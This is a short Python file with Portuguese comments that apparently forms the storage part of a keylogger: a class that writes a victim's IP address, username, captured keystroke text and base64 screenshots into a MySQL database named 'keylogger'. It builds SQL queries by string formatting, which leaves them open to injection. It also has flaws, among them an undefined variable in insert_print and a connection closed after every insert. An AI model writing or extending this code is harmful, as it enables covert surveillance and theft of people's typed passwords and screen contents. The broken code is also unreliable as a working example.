import pymysql
import ip
import screenshot as screen

class Database:

    def __init__(self):
        # Abrimos uma conexão com o banco de dados:
        self.conexao = pymysql.connect(db='keylogger', user='root', passwd='')
        # Cria um cursor:
        self.cursor = self.conexao.cursor()

        _ip = ip.Ip()
        self.getIP = _ip.get_ip()
        self.getUser = _ip.get_user()
    
    def insert(self, log, img = False):
        if img:
            screenPrint = screen.Screenshot()
            getImg = str(screenPrint.img_base64())
        else:
            getImg = ""

        # Executa o comando:
        sql = 'INSERT INTO dados (ip, user, texto, imagem) VALUES ("{0}", "{1}", "{2}", "{3}")'.format(self.getIP, self.getUser, log, getImg)
        self.cursor.execute(sql)
        
        # Efetua um commit no banco de dados.
        # Por padrão, não é efetuado commit automaticamente. Você deve commitar para salvar
        # suas alterações.
        self.conexao.commit()
        
        # Finaliza a conexão
        self.conexao.close()

    def insert_print(self):
        

        self.cursor.execute('INSERT INTO dados (ip, user, imagem) VALUES ("' + self.getIP + '","' + self.getUser + '","' + getImg + '")')
        
        self.conexao.commit()
        self.conexao.close()
